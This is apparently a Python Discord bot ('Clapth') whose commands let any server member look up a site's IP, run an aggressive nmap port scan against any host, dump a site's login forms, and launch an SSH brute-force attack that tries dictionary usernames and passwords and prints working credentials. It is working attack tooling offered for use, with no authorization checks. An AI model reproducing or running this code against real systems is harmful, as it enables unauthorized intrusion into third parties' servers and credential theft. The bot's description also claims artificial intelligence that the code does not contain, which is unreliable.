#Librerias
import os
import discord
from discord.ext import commands 
from dotenv import load_dotenv, main 
import nmap
import socket
import mechanize
import paramiko
import time

#Conexion con el bot
load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")

#Prefijo del bot 
bot = commands.Bot(command_prefix='-')  

@bot.command(name='presentación')
async def presentación(ctx):
    embed = discord.Embed(title="Hola! Soy Clapth", description="Clapth es un bot que por el momento contiene 4 herramientas que nos ayudan bastante en el mundo del hacking.", color = 0xFF0000)
    embed.set_author(name="Autor: Estrella", icon_url="http://b.rgbimg.com/cache1nGiWN/users/h/hi/hisks/600/mhYlBRK.jpg")
    embed.set_thumbnail(url="https://static.vecteezy.com/system/resources/previews/000/610/413/original/letter-v-logo-luxury-metal-logo-design-concept-template-vector.jpg")
    embed.add_field(name="Librerias", value="Las librerias de Clapth son en total 8, y cada una es fundamental para su funcionamineto", inline=False)
    embed.add_field(name="Inteligencia Artificial", value="El bot cuenta con inteligencia artificial, ya que esto es fundamental par asu funcionamiento, sin IA el bot no podria leer nuestros comandos, tampoco podria ejecutar funciones.", inline=True)
    embed.add_field(name="Clapth", value="Clapth fue diseñado principalmetne para poder ejecutarse en un servidor poderoso, también para que todo miembro con acceso puedo hacer uso de las herramientas que están ahora y las de un futuro.", inline=True)
    await ctx.send(embed=embed)

    

@bot.command(name='funciones')
async def funciones(ctx):
    embed = discord.Embed(title="Hola! Soy Clapth", description="A continuación te mostraré el funcionamiento del bot Clapth:", color = 0x00FF00)
    embed.set_thumbnail(url="https://images2.alphacoders.com/218/218512.jpg")
    embed.add_field(name="1", value="Sacar la ip de una pagina web, su sintaxis es: -ip url", inline = False)
    embed.add_field(name="2", value="Enumeración de puertos, su sintaxis es: -enum ip", inline = False)
    embed.add_field(name="3", value="Información de un login de una pagina web, su sintaxis es: -logininfo url", inline = False)
    embed.add_field(name="4", value="SSH brute, resultado disponible en la terminal, su sinxtasis es: -sshbrute ip", inline = False)
    await ctx.send(embed=embed)
    
        
@bot.command()
async def ip(ctx, *, url):
    print(f"La ip de {url} es {socket.gethostbyname(url)}")
    await ctx.send(f"La ip de {url} es {socket.gethostbyname(url)}")

@bot.command()
async def enum(ctx, *, objetivo):
    await ctx.send("Escaneando:")
    nm = nmap.PortScanner()
    result = nm.scan(hosts=objetivo, arguments="-sT -T5 ")
    print("Ip : %s" % objetivo)
    await ctx.send(("Ip : %s" % objetivo)) 
    print("Estado : %s" % nm[objetivo].state())
    await ctx.send("Estado : %s" % nm[objetivo].state())
    a = nm[objetivo].all_protocols()
    
    for protocolo in a:
        print("Protocolo_%s" % protocolo)
        await ctx.send("Protocolo_%s" % protocolo)
        lport = nm[objetivo][protocolo].keys()
        sorted(lport)
        
        for port in lport:
            print("Puerto: %s\testado : %s" % (port, nm[objetivo][protocolo][port]["state"]))
            await ctx.send("Puerto: %s\testado : %s" % (port, nm[objetivo][protocolo][port]["state"]))
        print("Escaneo Finalizado")
        await ctx.send("Escaneo Finalizado")

@bot.command()
async def sshbrute(ctx, *, ip1):
    await ctx.send("Comenzando ataque de fuerza bruta")
    def brute(host, puerto, user, password):
        log = paramiko.util.log_to_file("log.log")
        cliente = paramiko.SSHClient()
        cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            cliente.connect(host, port=puerto, username=user, password=password)
            print("Estas son las credenciales {}:{}".format(user,password))
           # bot.send("Estas son las credenciales {}:{}".format(user,password))
        
        except:
            print("Credenciales incorrectas")
            #message.Message.send("Credenciales incorrectas")

    ip = ip1    
    puerto = 22
    usuario = open('diccionario.txt', "r")
    usuario = usuario.read().split("\n")
    passwords = open('diccionario.txt', "r")
    passwords = passwords.read().split("\n")

    for a1 in usuario:
        for a2 in passwords:
            time.sleep(4)
            brute(ip, puerto, a1, a2)
    await ctx.send("Ataque finalizado.")
@bot.command()
async def logininfo(ctx, *, url):
    
    nav = mechanize.Browser()
    
    nav.set_handle_robots(False)
    nav.set_handle_equiv(False)
    
    nav.open(url)
    
    nav.addheaders=[("User-Agent","Firefox")]
    
    for a in nav.forms():
        print(a)
        await ctx.send(a)
        
bot.run(TOKEN)

